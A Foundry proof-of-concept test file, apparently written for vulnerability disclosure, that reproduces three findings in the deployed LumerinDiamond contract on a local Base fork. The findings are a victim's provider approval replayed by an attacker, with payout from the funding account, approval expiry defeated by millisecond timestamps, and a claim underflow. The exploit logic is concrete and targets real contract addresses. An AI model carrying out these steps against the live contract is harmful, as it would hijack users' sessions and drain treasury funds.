// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/// @notice Minimal interface of the LumerinDiamond (Base) needed for the PoC.
/// @dev Only the selectors used by the tests; structs mirror
///      ISessionStorage.Session / IProviderStorage.Provider / IBidStorage.Bid.
interface IDiamond {
    struct Session {
        address user;
        bytes32 bidId;
        uint256 stake;
        bytes closeoutReceipt;
        uint256 closeoutType;
        uint256 providerWithdrawnAmount;
        uint128 openedAt;
        uint128 endsAt;
        uint128 closedAt;
        bool isActive;
        bool isDirectPaymentFromUser;
    }
    struct Bid {
        address provider;
        bytes32 modelId;
        uint256 pricePerSecond;
        uint256 nonce;
        uint128 createdAt;
        uint128 deletedAt;
    }
    struct Provider {
        string endpoint;
        uint256 stake;
        uint128 createdAt;
        uint128 limitPeriodEnd;
        uint256 limitPeriodEarned;
        bool isDeleted;
    }

    function openSession(address user_, uint256 amount_, bool isDirectPaymentFromUser_, bytes calldata approvalEncoded_, bytes calldata signature_) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function claimForProvider(bytes32 sessionId_) external;
    function getSession(bytes32 sessionId_) external view returns (Session memory);
    function getBid(bytes32 bidId_) external view returns (Bid memory);
    function isBidActive(bytes32 bidId_) external view returns (bool);
    function getProvider(address provider_) external view returns (Provider memory);
    function getComputeBalance(uint128 timestamp_) external view returns (uint256);
    function totalMORSupply(uint128 timestamp_) external view returns (uint256);
    function stakeToStipend(uint256 amount_, uint128 timestamp_) external view returns (uint256);
    function stipendToStake(uint256 stipend_, uint128 timestamp_) external view returns (uint256);
    function getSessionEnd(uint256 amount_, uint256 pricePerSecond_, uint128 openedAt_) external view returns (uint128);
    function getFundingAccount() external view returns (address);
    function getToken() external view returns (address);
    function getBidFee() external view returns (uint256);
    function getMaxSessionDuration() external view returns (uint128);
    function getMinMaxBidPricePerSecond() external view returns (uint256, uint256);
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function modelRegister(address modelOwner_, bytes32 baseModelId_, bytes32 ipfsCID_, uint256 fee_, uint256 amount_, string calldata name_, string[] memory tags_) external;
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);
    function getBidId(address provider_, bytes32 modelId_, uint256 nonce_) external pure returns (bytes32);
}

interface IERC20Minimal {
    function balanceOf(address account_) external view returns (uint256);
    function approve(address spender_, uint256 amount_) external returns (bool);
}

/// @title LumerinDiamond approval findings — Base mainnet fork PoC
/// @notice Local fork testing ONLY. No mainnet transactions, no real funds.
///         Every state change happens on a local Foundry fork; `deal()` mints
///         fork-local MOR/ETH to test accounts, nothing is broadcast.
/// @dev Why a fresh provider/bid instead of the live bid?
///       The live bid's provider key is unknown, and openSession verifies the
///       approval signature against bid.provider. The vulnerability is in the
///       DEPLOYED SessionRouter facet code, which is identical for every bid:
///       the PoC therefore (a) reads and asserts a REAL live bid on the fork,
///       (b) registers its own provider/model/bid on the forked diamond with
///       the live bid's price, and (c) attacks that bid with a provider key
///       the test controls. All stipend / funding-account / MOR accounting
///       uses live fork state (real computeBalance, totalSupply, funding
///       account balance + allowance).
contract LumerinApprovalPoC is Test {
    IDiamond constant DIAMOND = IDiamond(0x6aBE1d282f72B474E54527D93b979A4f64d3030a);
    IERC20Minimal constant MOR = IERC20Minimal(0x7431aDa8a591C955a994a21710752EF9b882b8e3);
    address constant FUNDING = 0x5160C0311A95E0A1072FA85Df23712A7BA1cD4b1;
    uint256 constant CHAIN_ID = 8453;

    // Live bid, verified on-chain 2026-11-16 ~10:52 UTC at block 58179597:
    // deepseek-v4-flash-0731, healthy, provider stake 150,000 MOR.
    bytes32 constant LIVE_BID = 0x59fffb86aa1d23a50003760138ed8558865fd4db1664b5fcee98e44edb38bdfc;
    address constant LIVE_PROVIDER = 0xfF460118796438Aa9c6BEE56B99e300b95E42dbB;
    uint256 constant LIVE_PRICE = 52777777777778; // wei/s

    // Pinned fork block (2026-11-16 ~10:52 UTC). Override with FORK_BLOCK_NUMBER.
    uint256 constant DEFAULT_FORK_BLOCK = 58179707;

    // Test-only keys (anvil-style throwaway keys; no real funds anywhere).
    uint256 constant PROVIDER_PK = 0x1111;
    uint256 constant VICTIM_PK = 0x2222;
    uint256 constant ATTACKER_PK = 0x3333;
    uint256 constant PROVIDER2_PK = 0x4444;

    address provider;
    address victim;
    address attacker;
    address provider2;

    bytes32 bidId; // our fork-local bid, priced at LIVE_PRICE

    error SessionDuplicateApproval();
    error SessionApproveExpired();
    error SessionProviderSignatureMismatch();

    function setUp() public {
        provider = vm.addr(PROVIDER_PK);
        victim = vm.addr(VICTIM_PK);
        attacker = vm.addr(ATTACKER_PK);
        provider2 = vm.addr(PROVIDER2_PK);

        string memory rpc = vm.envOr("BASE_RPC_URL", string("https://base-rpc.publicnode.com"));
        uint256 forkBlock = vm.envOr("FORK_BLOCK_NUMBER", DEFAULT_FORK_BLOCK);
        vm.createSelectFork(rpc, forkBlock);
        console.log("fork block:", forkBlock);
        console.log("chainid:", block.chainid, "block.timestamp:", block.timestamp);

        // --- (a) Ground the PoC in a REAL live bid, read on the fork ---
        assertTrue(DIAMOND.isBidActive(LIVE_BID), "live bid must be active at fork block");
        IDiamond.Bid memory live = DIAMOND.getBid(LIVE_BID);
        assertEq(live.provider, LIVE_PROVIDER, "live bid provider mismatch");
        assertEq(live.pricePerSecond, LIVE_PRICE, "live bid price mismatch");
        IDiamond.Provider memory lp = DIAMOND.getProvider(LIVE_PROVIDER);
        console.log("LIVE bid provider stake (MOR):", lp.stake / 1 ether);
        console.log("LIVE bid pricePerSecond (wei):", live.pricePerSecond);
        console.log("computeBalance (MOR):", DIAMOND.getComputeBalance(uint128(block.timestamp)) / 1 ether);
        console.log("totalMORSupply (MOR):", DIAMOND.totalMORSupply(uint128(block.timestamp)) / 1 ether);
        console.log("funding MOR balance:", MOR.balanceOf(FUNDING) / 1 ether);

        // --- (b) Our own provider/model/bid on the forked diamond ---
        // Fork-local MOR/ETH: deal() only changes fork state, nothing on mainnet.
        deal(address(MOR), provider, 300_000 ether);
        deal(address(MOR), victim, 20_000 ether);
        deal(address(MOR), attacker, 20_000 ether);
        deal(address(MOR), provider2, 10_000 ether);
        vm.deal(provider, 100 ether);
        vm.deal(victim, 100 ether);
        vm.deal(attacker, 100 ether);
        vm.deal(provider2, 100 ether);

        bidId = _makeBid(PROVIDER_PK, provider, 100_000 ether, LIVE_PRICE);
        assertTrue(DIAMOND.isBidActive(bidId), "our bid must be active");
        console.log("our bidId:");
        console.logBytes32(bidId);
    }

    /// @dev Registers provider + model and posts a bid; returns the bidId.
    function _makeBid(uint256 pk_, address provider_, uint256 providerStake_, uint256 price_) internal returns (bytes32) {
        vm.startPrank(provider_);
        MOR.approve(address(DIAMOND), type(uint256).max);
        DIAMOND.providerRegister(provider_, providerStake_, "127.0.0.1:3333");
        bytes32 baseModelId = keccak256(abi.encodePacked("poc-model", provider_));
        string[] memory tags = new string[](0);
        DIAMOND.modelRegister(provider_, baseModelId, bytes32(0), 0, 0.1 ether, "poc", tags);
        bytes32 modelId = DIAMOND.getModelId(provider_, baseModelId);
        bytes32 bid = DIAMOND.postModelBid(provider_, modelId, price_);
        vm.stopPrank();
        return bid;
    }

    /// @dev Production approval encoding: abi.encode(bidId, chainId, user, timestamp).
    ///      Production timestamp is UnixMilli (see finding 2).
    function _signApproval(uint256 pk_, bytes32 bid_, address user_, uint128 timestamp_) internal returns (bytes memory approval, bytes memory sig) {
        approval = abi.encode(bid_, uint256(CHAIN_ID), user_, timestamp_);
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(approval)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk_, digest);
        sig = abi.encodePacked(r, s, v);
    }

    function _openAs(address who_, uint256 stake_, bytes memory approval_, bytes memory sig_) internal returns (bytes32) {
        vm.startPrank(who_);
        MOR.approve(address(DIAMOND), stake_);
        bytes32 sessionId = DIAMOND.openSession(who_, stake_, false, approval_, sig_);
        vm.stopPrank();
        return sessionId;
    }

    /*//////////////////////////////////////////////////////////////
                        FINDING 1 — HIGH
      Approval signed for VICTIM is accepted for ATTACKER.
    //////////////////////////////////////////////////////////////*/

    function test_F1_ApprovalForVictimUsableByAttacker() public {
        // Provider signs an approval for VICTIM only, production format
        // (ms timestamp, exactly as InitiateSessionResponse emits).
        uint128 tsMs = uint128(block.timestamp * 1000);
        (bytes memory approval, bytes memory sig) = _signApproval(PROVIDER_PK, bidId, victim, tsMs);

        uint256 stake = 10_000 ether;
        uint256 stipend = DIAMOND.stakeToStipend(stake, uint128(block.timestamp));
        console.log("attacker stake (MOR):", stake / 1 ether);
        console.log("stipend for that stake (MOR):", stipend / 1 ether);

        // --- Attacker front-runs: opens a session AS THEMSELVES with the victim's approval ---
        bytes32 sessionId = _openAs(attacker, stake, approval, sig);
        IDiamond.Session memory s = DIAMOND.getSession(sessionId);
        assertEq(s.user, attacker, "session must belong to attacker");
        assertEq(s.bidId, bidId, "session must be on our bid");
        assertTrue(s.isActive, "session must be active");
        assertFalse(s.isDirectPaymentFromUser, "non-direct mode: treasury pays provider");
        console.log("ATTACKER session opened, endsAt-openedAt (s):", uint256(s.endsAt - s.openedAt));
        console.log("sessionId:");
        console.logBytes32(sessionId);

        // --- Victim's own attempt with the SAME approval now reverts ---
        vm.startPrank(victim);
        MOR.approve(address(DIAMOND), stake);
        vm.expectRevert(SessionDuplicateApproval.selector);
        DIAMOND.openSession(victim, stake, false, approval, sig);
        vm.stopPrank();
        console.log("victim openSession reverted SessionDuplicateApproval (approval burned)");

        // --- Non-direct payout: provider is paid FROM THE FUNDING ACCOUNT ---
        uint256 expectedReward = (uint256(s.endsAt) - uint256(s.openedAt)) * LIVE_PRICE;
        console.log("expected provider reward (MOR):", expectedReward / 1 ether);
        vm.warp(uint256(s.endsAt) + 1);
        uint256 fundingBefore = MOR.balanceOf(FUNDING);
        uint256 providerBefore = MOR.balanceOf(provider);
        vm.prank(provider);
        DIAMOND.claimForProvider(sessionId);
        uint256 paid = MOR.balanceOf(provider) - providerBefore;
        uint256 fundingDelta = fundingBefore - MOR.balanceOf(FUNDING);
        console.log("provider paid (MOR):", paid / 1 ether);
        console.log("funding account drained (MOR):", fundingDelta / 1 ether);
        assertGt(paid, 0, "provider must be paid");
        assertEq(paid, expectedReward, "paid must equal duration * price");
        assertEq(fundingDelta, paid, "payment must come from funding account");
        // Sanity: reward is the stipend the attacker's stake entitled them to.
        assertLe(paid, stipend, "reward must not exceed stipend");
        assertGe(paid, stipend - LIVE_PRICE, "reward must be ~stipend (rounding < 1s of price)");
    }

    /*//////////////////////////////////////////////////////////////
                     FINDING 2 — MEDIUM (TTL dead)
    //////////////////////////////////////////////////////////////*/

    function test_F2_MsTimestampApprovalNeverExpires() public {
        // Production signer emits UnixMilli. An approval "issued" 7 DAYS ago
        // (in ms) is ~7000x past the 10-minute TTL in seconds terms — yet the
        // contract compares it against block.timestamp (seconds), so it passes.
        uint128 sevenDaysAgoMs = uint128((block.timestamp - 7 days) * 1000);
        (bytes memory approval, bytes memory sig) = _signApproval(PROVIDER_PK, bidId, victim, sevenDaysAgoMs);
        bytes32 sessionId = _openAs(victim, 10_000 ether, approval, sig);
        IDiamond.Session memory s = DIAMOND.getSession(sessionId);
        assertTrue(s.isActive, "7-day-old ms approval must NOT open a session if TTL worked");
        console.log("7-day-old (ms) approval ACCEPTED; session active. TTL is dead for ms timestamps.");
    }

    function test_F2_Control_SecondsTimestampDoesExpire() public {
        // Control: the same TTL logic DOES fire when the timestamp is in
        // seconds (as the test suite uses). This isolates the bug to the
        // ms-vs-seconds unit mismatch, not a missing check.
        uint128 elevenMinAgoSec = uint128(block.timestamp - 601);
        (bytes memory approval, bytes memory sig) = _signApproval(PROVIDER_PK, bidId, victim, elevenMinAgoSec);
        vm.startPrank(victim);
        MOR.approve(address(DIAMOND), 10_000 ether);
        vm.expectRevert(SessionApproveExpired.selector);
        DIAMOND.openSession(victim, 10_000 ether, false, approval, sig);
        vm.stopPrank();
        console.log("11-min-old (seconds) approval correctly reverted SessionApproveExpired.");
    }

    /*//////////////////////////////////////////////////////////////
                  FINDING 3 — LOW (claim underflow)
    //////////////////////////////////////////////////////////////*/

    function test_F3_ClaimForProviderUnderflowsAfterLateDisputedClose() public {
        // Second provider with a SMALL stake (500 MOR) and a MAX-PRICE bid,
        // so the close-time claim is capped by the stake limiter and a
        // remainder stays owed.
        uint256 price = 1e16; // max allowed pricePerSecond
        bytes32 bid2 = _makeBid(PROVIDER2_PK, provider2, 500 ether, price);

        // Stake sized so the session reward is ~1000 MOR (>> 500 MOR stake).
        uint256 stake = DIAMOND.stipendToStake(1000 ether, uint128(block.timestamp));
        deal(address(MOR), victim, stake + 1 ether);
        console.log("F3 user stake (MOR):", stake / 1 ether);

        uint128 tsMs = uint128(block.timestamp * 1000);
        (bytes memory approval, bytes memory sig) = _signApproval(PROVIDER2_PK, bid2, victim, tsMs);
        bytes32 sessionId = _openAs(victim, stake, approval, sig);
        IDiamond.Session memory s = DIAMOND.getSession(sessionId);
        uint256 reward = (uint256(s.endsAt) - uint256(s.openedAt)) * price;
        console.log("F3 session reward (MOR):", reward / 1 ether);
        assertGt(reward, 500 ether, "reward must exceed provider stake so close caps");

        // Late close (past endsAt) WITH a dispute: receipt signed by a wrong
        // key (well-formed 65-byte sig, so no I-2 revert; signer != provider
        // => noDispute = false). Late close => close-time code SKIPS holdback.
        vm.warp(uint256(s.endsAt) + 1);
        // Push closedAt to ~23:59:59 UTC so the same-day holdback is maximal.
        uint256 dayStart = (block.timestamp / 1 days) * 1 days;
        vm.warp(dayStart + 86399);
        assertGe(block.timestamp, uint256(s.endsAt), "close must be late");
        bytes memory receipt = abi.encode(sessionId, uint256(CHAIN_ID), uint128(block.timestamp), uint32(1000), uint32(100));
        bytes32 rDigest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(receipt)));
        (uint8 v, bytes32 r, bytes32 sSig) = vm.sign(ATTACKER_PK, rDigest); // wrong signer => dispute
        vm.prank(victim);
        DIAMOND.closeSession(receipt, abi.encodePacked(r, sSig, v));

        IDiamond.Session memory closed = DIAMOND.getSession(sessionId);
        uint256 remainder = reward - closed.providerWithdrawnAmount;
        console.log("F3 paid at close (MOR):", closed.providerWithdrawnAmount / 1 ether);
        console.log("F3 remainder owed (MOR):", remainder / 1 ether);
        assertEq(closed.providerWithdrawnAmount, 500 ether, "close must be capped at provider stake");
        assertGt(remainder, 0, "a remainder must still be owed");

        // Same-day claimForProvider: holdback (~864 MOR) > remainder (~500 MOR)
        // => `_getProviderRewards - _getProviderOnHoldAmount` underflows.
        vm.prank(provider2);
        vm.expectRevert(abi.encodeWithSelector(bytes4(0x4e487b71), uint256(0x11))); // Panic(0x11)
        DIAMOND.claimForProvider(sessionId);
        console.log("F3 claimForProvider REVERTED (panic 0x11 underflow) on the close day.");

        // Next UTC day boundary: holdback -> 0, the call no longer reverts
        // (it pays 0 here because the 365-day stake limiter is already
        // exhausted by the 500 MOR paid at close — the revert, not the funds,
        // is what self-heals; see README).
        vm.warp(dayStart + 1 days + 1);
        vm.prank(provider2);
        DIAMOND.claimForProvider(sessionId);
        console.log("F3 claimForProvider succeeded after the day boundary (pays 0: stake limiter exhausted).");
    }
}
